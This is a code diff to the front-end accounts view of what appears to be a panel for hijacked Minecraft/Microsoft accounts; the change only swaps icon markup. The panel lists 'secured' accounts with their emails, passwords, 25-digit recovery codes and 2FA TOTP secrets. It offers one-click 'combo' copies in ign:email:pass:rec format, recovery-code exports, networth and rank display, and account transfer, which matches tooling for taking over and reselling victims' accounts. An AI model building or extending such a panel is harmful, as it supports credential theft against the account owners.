@@ -18,7 +18,7 @@ const AccountsView = {
       <div class="accounts-metrics-ribbon" id="accounts-metrics-container">
         <div class="metric-stat-card">
           <div class="metric-stat-icon amber">
-            <i class="fas fa-users-viewfinder"></i>
+            <re-icon icon="users" size="20" aria-hidden="true"></re-icon>
           </div>
           <div class="metric-stat-info">
             <span class="metric-stat-label">Secured Accounts</span>
@@ -28,7 +28,7 @@ const AccountsView = {
 
         <div class="metric-stat-card">
           <div class="metric-stat-icon green">
-            <i class="fas fa-cube"></i>
+            <re-icon icon="three-d-cube" size="20" aria-hidden="true"></re-icon>
           </div>
           <div class="metric-stat-info">
             <span class="metric-stat-label">Minecraft Owners</span>
@@ -38,7 +38,7 @@ const AccountsView = {
 
         <div class="metric-stat-card">
           <div class="metric-stat-icon blue">
-            <i class="fas fa-crown"></i>
+            <re-icon icon="crown" size="20" aria-hidden="true"></re-icon>
           </div>
           <div class="metric-stat-info">
             <span class="metric-stat-label">Hypixel Ranked</span>
@@ -48,7 +48,7 @@ const AccountsView = {
 
         <div class="metric-stat-card">
           <div class="metric-stat-icon orange">
-            <i class="fas fa-shield-virus"></i>
+            <re-icon icon="shield-alert" size="20" aria-hidden="true"></re-icon>
           </div>
           <div class="metric-stat-info">
             <span class="metric-stat-label">Quarantine Vault</span>
@@ -69,11 +69,11 @@ const AccountsView = {
                      onkeydown="if(event.key==='Enter') AccountsView.onSearch()" />
             </div>
             <button class="btn btn-secondary" onclick="AccountsView.onSearch()" title="Search Accounts">
-              <i class="fas fa-search"></i>
+              <re-icon icon="search" size="14" aria-hidden="true"></re-icon>
             </button>
             ${this.state.search ? `
               <button class="btn btn-secondary btn-sm" onclick="AccountsView.clearSearch()" title="Clear Search">
-                <i class="fas fa-times"></i>
+                <re-icon icon="x" size="13" aria-hidden="true"></re-icon>
               </button>
             ` : ''}
           </div>
@@ -85,42 +85,42 @@ const AccountsView = {
               <button class="btn btn-sm ${this.state.viewMode === 'grid' ? 'btn-primary' : 'btn-secondary'}" 
                       style="padding:6px 12px;font-size:0.75rem;"
                       onclick="AccountsView.setViewMode('grid')" title="3D Cards Grid View">
-                <i class="fas fa-grip"></i> Cards
+                <re-icon icon="grid" size="14" aria-hidden="true"></re-icon> Cards
               </button>
               <button class="btn btn-sm ${this.state.viewMode === 'table' ? 'btn-primary' : 'btn-secondary'}" 
                       style="padding:6px 12px;font-size:0.75rem;"
                       onclick="AccountsView.setViewMode('table')" title="Compact Table View">
-                <i class="fas fa-list"></i> Table
+                <re-icon icon="list" size="14" aria-hidden="true"></re-icon> Table
               </button>
             </div>
 
             <button class="btn btn-primary btn-sm" onclick="AccountsView.openAddAccountModal()">
-              <i class="fas fa-plus"></i> Add Account
+              <re-icon icon="plus" size="14" aria-hidden="true"></re-icon> Add Account
             </button>
 
             <!-- Export Dropdown -->
             <div class="dropdown" style="position:relative;display:inline-block;">
               <button class="btn btn-secondary btn-sm" onclick="AccountsView.toggleExportDropdown()">
-                <i class="fas fa-download"></i> Export <i class="fas fa-caret-down"></i>
+                <re-icon icon="download" size="14" aria-hidden="true"></re-icon> Export <re-icon icon="chevron-down" size="11" aria-hidden="true"></re-icon>
               </button>
               <div id="export-dropdown-menu" style="display:none;position:absolute;right:0;top:100%;margin-top:6px;background:var(--bg-card);border:1px solid var(--border-card);border-radius:var(--radius-md);box-shadow:var(--shadow-lg);z-index:40;min-width:190px;overflow:hidden;">
                 <a href="/api/accounts/export/download?format=txt&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
-                  <i class="fas fa-file-lines" style="color:var(--primary);"></i> Download TXT
+                  <re-icon icon="feed" size="14" style="color:var(--primary);" aria-hidden="true"></re-icon> Download TXT
                 </a>
                 <a href="/api/accounts/export/download?format=csv&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
-                  <i class="fas fa-file-csv" style="color:#38bdf8;"></i> Download CSV
+                  <re-icon icon="feed" size="14" style="color:#38bdf8;" aria-hidden="true"></re-icon> Download CSV
                 </a>
                 <a href="/api/accounts/export/download?format=json&scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;">
-                  <i class="fas fa-file-code" style="color:#34d399;"></i> Download JSON
+                  <re-icon icon="code-file" size="14" style="color:#34d399;" aria-hidden="true"></re-icon> Download JSON
                 </a>
                 <a href="/api/accounts/export/recovery-codes?scope=${this.state.scope}" target="_blank" class="nav-item" style="margin:0;border-radius:0;padding:10px 14px;font-size:0.8rem;border-top:1px solid var(--border-color);">
-                  <i class="fas fa-key" style="color:#fbbf24;"></i> Recovery Codes Only
+                  <re-icon icon="key" size="14" style="color:#fbbf24;" aria-hidden="true"></re-icon> Recovery Codes Only
                 </a>
               </div>
             </div>
 
             <button class="btn btn-danger btn-sm" onclick="AccountsView.confirmDeleteAll()" title="Delete all user accounts">
-              <i class="fas fa-trash-alt"></i>
+              <re-icon icon="trash" size="14" aria-hidden="true"></re-icon>
             </button>
           </div>
         </div>
@@ -130,10 +130,10 @@ const AccountsView = {
           <div style="display:flex;gap:6px;flex-wrap:wrap;">
             <button class="btn btn-sm ${this.state.filter === 'all' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('all')">All</button>
             <button class="btn btn-sm ${this.state.filter === 'mc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('mc')">
-              <i class="fas fa-cube"></i> Owns MC
+              <re-icon icon="three-d-cube" size="20" aria-hidden="true"></re-icon> Owns MC
             </button>
             <button class="btn btn-sm ${this.state.filter === 'capes' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('capes')">
-              <i class="fas fa-shield"></i> Has Capes
+              <re-icon icon="shield" size="13" aria-hidden="true"></re-icon> Has Capes
             </button>
             <button class="btn btn-sm ${this.state.filter === 'nomc' ? 'btn-primary' : 'btn-secondary'}" onclick="AccountsView.setFilter('nomc')">No MC</button>
           </div>
@@ -211,7 +211,7 @@ const AccountsView = {
       if (!accounts.length) {
         container.innerHTML = `
           <div class="card" style="text-align:center;padding:60px 20px;">
-            <i class="fas fa-user-slash fa-3x" style="color:var(--text-dim);margin-bottom:16px;"></i>
+            <re-icon icon="user" size="36" style="color:var(--text-dim);margin-bottom:16px;" aria-hidden="true"></re-icon>
             <h3 style="color:#fff;font-size:1.15rem;font-weight:600;">No accounts found</h3>
             <p style="font-size:0.85rem;color:var(--text-dim);margin-top:6px;max-width:400px;margin-left:auto;margin-right:auto;">
               ${this.state.search ? `No accounts matched "${this.state.search}". Try clearing your search query.` : 'There are no secured accounts in this category yet.'}
@@ -236,7 +236,7 @@ const AccountsView = {
     } catch (err) {
       container.innerHTML = `
         <div class="card" style="text-align:center;padding:40px;color:var(--danger);">
-          <i class="fas fa-exclamation-triangle fa-2x" style="margin-bottom:10px;"></i>
+          <re-icon icon="alert-triangle" size="24" style="margin-bottom:10px;" aria-hidden="true"></re-icon>
           <div>Error loading accounts: ${err.message}</div>
         </div>
       `;
@@ -263,12 +263,12 @@ const AccountsView = {
       // Minecraft Status
       const ownsMc = acc.ownsmc && !acc.ownsmc.includes('Failed') && acc.ownsmc !== 'No MC';
       const mcBadge = ownsMc 
-        ? `<span class="badge-tag success"><i class="fas fa-check-circle"></i> ${acc.ownsmc}</span>`
-        : `<span class="badge-tag danger"><i class="fas fa-times-circle"></i> ${acc.ownsmc || 'No MC'}</span>`;
+        ? `<span class="badge-tag success"><re-icon icon="check-circle" size="13" aria-hidden="true"></re-icon> ${acc.ownsmc}</span>`
+        : `<span class="badge-tag danger"><re-icon icon="alert-circle" size="13" aria-hidden="true"></re-icon> ${acc.ownsmc || 'No MC'}</span>`;
 
       // Quarantine
       const quarantineBadge = acc.is_quarantined
-        ? `<span class="badge-tag danger"><i class="fas fa-shield-virus"></i> Quarantined</span>`
+        ? `<span class="badge-tag danger"><re-icon icon="shield-alert" size="20" aria-hidden="true"></re-icon> Quarantined</span>`
         : '';
 
       // Networth calculation & display
@@ -301,16 +301,16 @@ const AccountsView = {
       // Capes Pill list
       const capesList = acc.capesList || [];
       const capeIcons = {
-        'migrator': '🛡️ Migrator',
-        'vanilla': '🧁 Vanilla',
-        'cherry': '🌸 Cherry',
-        '15th': '🎂 15th Anniv',
-        'tiktok': '📱 TikTok',
-        'twitch': '🟣 Twitch',
-        'minecon': '🏆 Minecon',
-        'pan': '🍳 Pan',
-        'common': '🪶 Common',
-        'founder': '⛏️ Founder'
+        'migrator': '<re-icon icon="shield" size="13" aria-hidden="true"></re-icon> Migrator',
+        'vanilla': '<re-icon icon="box2" size="13" aria-hidden="true"></re-icon> Vanilla',
+        'cherry': '<re-icon icon="heart" size="13" aria-hidden="true"></re-icon> Cherry',
+        '15th': '<re-icon icon="star" size="13" aria-hidden="true"></re-icon> 15th Anniv',
+        'tiktok': '<re-icon icon="video" size="13" aria-hidden="true"></re-icon> TikTok',
+        'twitch': '<re-icon icon="play" size="13" aria-hidden="true"></re-icon> Twitch',
+        'minecon': '<re-icon icon="trophy" size="13" aria-hidden="true"></re-icon> Minecon',
+        'pan': '<re-icon icon="sun" size="13" aria-hidden="true"></re-icon> Pan',
+        'common': '<re-icon icon="tag" size="13" aria-hidden="true"></re-icon> Common',
+        'founder': '<re-icon icon="award" size="13" aria-hidden="true"></re-icon> Founder'
       };
 
       let capesHtml = '';
@@ -318,11 +318,11 @@ const AccountsView = {
         capesHtml = capesList.map(cape => {
           const cLower = String(cape).toLowerCase();
           const matched = Object.keys(capeIcons).find(k => cLower.includes(k));
-          const label = matched ? capeIcons[matched] : `🏷️ ${cape}`;
+          const label = matched ? capeIcons[matched] : `<re-icon icon="tag" size="11" aria-hidden="true"></re-icon> ${cape}`;
           return `<span class="cape-pill">${label}</span>`;
         }).join('');
       } else {
-        capesHtml = `<span class="cape-pill empty"><i class="fas fa-ban"></i> No Capes</span>`;
+        capesHtml = `<span class="cape-pill empty"><re-icon icon="ban" size="12" aria-hidden="true"></re-icon> No Capes</span>`;
       }
 
       const maskedRec = acc.recoverycode 
@@ -339,7 +339,7 @@ const AccountsView = {
               <button class="btn btn-secondary btn-sm" style="font-size:0.7rem;padding:2px 7px;" 
                       title="Copy combo (ign:email:pass:rec)" 
                       onclick="AccountsView.copyFormatted('${acc.uid}', '${acc.username}', '${acc.ownsmc}', '${(acc.capesList || []).join(', ')}', '${acc.recoverycode}', '${acc.email}', '${acc.secemail}', '${acc.secretkey}', '${acc.password}')">
-                <i class="far fa-copy"></i> Combo
+                <re-icon icon="copy" size="13" aria-hidden="true"></re-icon> Combo
               </button>
             </div>
           </div>
@@ -361,7 +361,7 @@ const AccountsView = {
               <div class="account-username-title" title="${acc.username || 'Unknown'}">
                 <span>${acc.username || 'Unclaimed'}</span>
                 <button class="account-username-btn" title="Copy Username" onclick="event.stopPropagation();API.copyText('${acc.username}', 'Username')">
-                  <i class="far fa-copy"></i>
+                  <re-icon icon="copy" size="13" aria-hidden="true"></re-icon>
                 </button>
               </div>
               <span class="account-uid-tag">#${acc.uid}</span>
@@ -372,7 +372,7 @@ const AccountsView = {
               <div class="account-spec-chip" title="Account Networth">
                 <span class="account-spec-label">Worth</span>
                 <div class="account-spec-value worth-value">
-                  <i class="fas fa-coins" style="font-size:0.8rem;color:#f59e0b;"></i>
+                  <re-icon icon="coins" size="13" style="color:#f59e0b;" aria-hidden="true"></re-icon>
                   ${worthDisplay}
                 </div>
               </div>
@@ -402,7 +402,7 @@ const AccountsView = {
                 <div class="cred-text" title="${acc.recoverycode || ''}">${maskedRec}</div>
               </div>
               <button class="cred-copy-btn" title="Copy 25-digit Recovery Code" onclick="event.stopPropagation();API.copyText('${acc.recoverycode}', 'Recovery Code')">
-                <i class="far fa-copy"></i> Copy
+                <re-icon icon="copy" size="13" aria-hidden="true"></re-icon> Copy
               </button>
             </div>
           </div>
@@ -410,13 +410,13 @@ const AccountsView = {
           <!-- Card Footer Actions -->
           <div class="account-card-footer">
             <button class="btn btn-secondary btn-sm" style="flex:1;" onclick="AccountsView.inspectAccount('${acc.uid}')">
-              <i class="fas fa-magnifying-glass"></i> Inspect
+              <re-icon icon="search" size="13" aria-hidden="true"></re-icon> Inspect
             </button>
             <button class="btn btn-secondary btn-sm" title="Transfer Account" onclick="AccountsView.openMoveModal('${acc.uid}')">
-              <i class="fas fa-exchange-alt"></i>
+              <re-icon icon="arrow-right" size="13" aria-hidden="true"></re-icon>
             </button>
             <button class="btn btn-danger btn-sm" title="Delete Account" onclick="AccountsView.deleteAccount('${acc.uid}')">
-              <i class="fas fa-trash"></i>
+              <re-icon icon="trash" size="14" aria-hidden="true"></re-icon>
             </button>
           </div>
         </div>
@@ -463,7 +463,7 @@ const AccountsView = {
                           <div>
                             <div style="font-weight:600;display:flex;align-items:center;gap:6px;">
                               ${acc.username || 'Unknown'}
-                              ${acc.is_quarantined ? '<span class="badge-tag danger"><i class="fas fa-lock"></i></span>' : ''}
+                              ${acc.is_quarantined ? '<span class="badge-tag danger"><re-icon icon="lock" size="12" aria-hidden="true"></re-icon></span>' : ''}
                             </div>
                             <div style="font-size:0.72rem;color:var(--text-dim);font-family:var(--font-mono);">#${acc.uid}</div>
                           </div>
@@ -483,7 +483,7 @@ const AccountsView = {
                       <td>
                         <button class="btn btn-secondary btn-sm" style="font-family:var(--font-mono);font-size:0.75rem;" 
                                 onclick="API.copyText('${acc.recoverycode}', 'Recovery Code')">
-                          <i class="far fa-copy"></i> ${acc.recoverycode ? acc.recoverycode.substring(0, 11) + '...' : 'N/A'}
+                          <re-icon icon="copy" size="13" aria-hidden="true"></re-icon> ${acc.recoverycode ? acc.recoverycode.substring(0, 11) + '...' : 'N/A'}
                         </button>
                       </td>
                       <td style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-muted);">
@@ -492,16 +492,16 @@ const AccountsView = {
                       <td style="text-align:right;">
                         <div class="btn-group" style="justify-content:flex-end;">
                           <button class="btn btn-secondary btn-sm" title="Inspect" onclick="AccountsView.inspectAccount('${acc.uid}')">
-                            <i class="fas fa-search"></i>
+                            <re-icon icon="search" size="14" aria-hidden="true"></re-icon>
                           </button>
                           <button class="btn btn-secondary btn-sm" title="Copy Combo" onclick="AccountsView.copyFormatted('${acc.uid}', '${acc.username}', '${acc.ownsmc}', '${(acc.capesList || []).join(', ')}', '${acc.recoverycode}', '${acc.email}', '${acc.secemail}', '${acc.secretkey}', '${acc.password}')">
-                            <i class="fas fa-file-alt"></i>
+                            <re-icon icon="feed" size="13" aria-hidden="true"></re-icon>
                           </button>
                           <button class="btn btn-secondary btn-sm" title="Transfer" onclick="AccountsView.openMoveModal('${acc.uid}')">
-                            <i class="fas fa-exchange-alt"></i>
+                            <re-icon icon="arrow-right" size="13" aria-hidden="true"></re-icon>
                           </button>
                           <button class="btn btn-danger btn-sm" title="Delete" onclick="AccountsView.deleteAccount('${acc.uid}')">
-                            <i class="fas fa-trash"></i>
+                            <re-icon icon="trash" size="14" aria-hidden="true"></re-icon>
                           </button>
                         </div>
                       </td>
@@ -526,10 +526,10 @@ const AccountsView = {
         </div>
         <div style="display:flex;gap:8px;">
           <button class="btn btn-secondary btn-sm" ${pagination.page <= 1 ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page - 1})">
-            <i class="fas fa-chevron-left"></i> Previous
+            <re-icon icon="chevron-left" size="12" aria-hidden="true"></re-icon> Previous
           </button>
           <button class="btn btn-secondary btn-sm" ${pagination.page >= pagination.totalPages ? 'disabled' : ''} onclick="AccountsView.setPage(${pagination.page + 1})">
-            Next <i class="fas fa-chevron-right"></i>
+            Next <re-icon icon="chevron-right" size="12" aria-hidden="true"></re-icon>
           </button>
         </div>
       </div>
@@ -610,7 +610,7 @@ const AccountsView = {
             <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
               <span class="badge-tag ${acc.ownsmc && !acc.ownsmc.includes('Failed') ? 'success' : 'danger'}">${acc.ownsmc || 'None'}</span>
               <span class="badge-tag warning">${acc.capes || 'No Capes'}</span>
-              ${acc.quarantine ? '<span class="badge-tag danger"><i class="fas fa-lock"></i> Quarantined</span>' : ''}
+              ${acc.quarantine ? '<span class="badge-tag danger"><re-icon icon="lock" size="12" aria-hidden="true"></re-icon> Quarantined</span>' : ''}
             </div>
             <div style="font-size:0.78rem;color:var(--text-dim);margin-top:8px;">
               Added: <b>${acc.time ? new Date(parseInt(acc.time, 10) * 1000).toLocaleString() : 'N/A'}</b>
@@ -632,7 +632,7 @@ const AccountsView = {
               <label class="form-label">Email Address</label>
               <div style="display:flex;gap:8px;">
                 <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.email}" />
-                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.email}', 'Email')"><i class="far fa-copy"></i></button>
+                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.email}', 'Email')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
               </div>
             </div>
 
@@ -640,7 +640,7 @@ const AccountsView = {
               <label class="form-label">Password</label>
               <div style="display:flex;gap:8px;">
                 <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.password || ''}" />
-                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.password}', 'Password')"><i class="far fa-copy"></i></button>
+                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.password}', 'Password')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
               </div>
             </div>
 
@@ -648,7 +648,7 @@ const AccountsView = {
               <label class="form-label">25-Digit Recovery Code</label>
               <div style="display:flex;gap:8px;">
                 <input type="text" class="form-input" style="font-family:var(--font-mono);color:#34d399;font-weight:600;" readonly value="${acc.recoverycode || ''}" />
-                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.recoverycode}', 'Recovery Code')"><i class="far fa-copy"></i></button>
+                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.recoverycode}', 'Recovery Code')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
               </div>
             </div>
 
@@ -656,7 +656,7 @@ const AccountsView = {
               <label class="form-label">Secondary / Rescue Email</label>
               <div style="display:flex;gap:8px;">
                 <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.secemail || 'None'}" />
-                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.secemail}', 'Secondary Email')"><i class="far fa-copy"></i></button>
+                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.secemail}', 'Secondary Email')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
               </div>
             </div>
 
@@ -664,7 +664,7 @@ const AccountsView = {
               <label class="form-label">Secret Key (2FA TOTP)</label>
               <div style="display:flex;gap:8px;">
                 <input type="text" class="form-input" style="font-family:var(--font-mono);" readonly value="${acc.secretkey || 'Disabled'}" />
-                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.secretkey}', 'Secret Key')"><i class="far fa-copy"></i></button>
+                <button class="btn btn-secondary btn-sm" onclick="API.copyText('${acc.secretkey}', 'Secret Key')"><re-icon icon="copy" size="13" aria-hidden="true"></re-icon></button>
               </div>
             </div>
           </div>
